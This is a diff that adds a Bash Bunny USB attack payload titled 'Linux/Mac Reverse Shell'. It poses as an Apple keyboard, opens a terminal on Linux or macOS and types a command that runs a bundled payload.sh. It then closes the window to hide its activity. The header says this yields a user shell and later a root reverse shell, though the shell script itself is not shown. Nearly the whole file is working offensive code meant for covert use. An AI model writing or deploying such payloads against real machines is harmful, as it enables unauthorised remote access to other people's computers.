@@ -1,0 +1,50 @@
+# Title:         Linux/Mac Reverse Shell
+# Author:        Darkprince (Sridhar)
+# Version:       1.0
+#
+# Runs a script in the background that provides a user shell initially and waits for the user to escalate privileges, then provides a root reverse shell.
+
+# Magenta..................Setup
+# Red, Green, Blue.........Executing
+# Green....................Finished
+
+# INITIALIZING
+LED W
+
+# Mac keyboard works in Linux and Mac
+ATTACKMODE STORAGE HID VID_0X05AC PID_0X021E
+
+LANGUAGE='us'
+
+# Ensure the switch position is 1
+# Delay for HID device recognition
+Q DELAY 1000
+
+# ATTACKING
+LED R G B
+
+# Get Linux/Mac Terminal
+RUN UNITY xterm
+Q DELAY 1000
+# To close the opened window by the Linux run command
+Q GUI Q
+Q CTRL C
+RUN OSX terminal
+Q DELAY 1000
+
+# If Linux, then clearing 'terminal' which is typed by Mac run script
+Q CTRL C
+
+# Execute bash script which is the same for Mac and Linux
+GET SWITCH_POSITION
+Q STRING bash /Volumes/BashBunny/payloads/$SWITCH_POSITION/payload.sh
+
+# The cleanup process will be handled by the bash script
+# Closing the xterm in Linux
+# Closing the terminal in Mac, even if the terminal has other processes COMMAND Q and ENTER keys will terminate the terminal
+Q GUI Q
+Q CTRL C
+Q STRING exit
+Q ENTER
+
+LED G
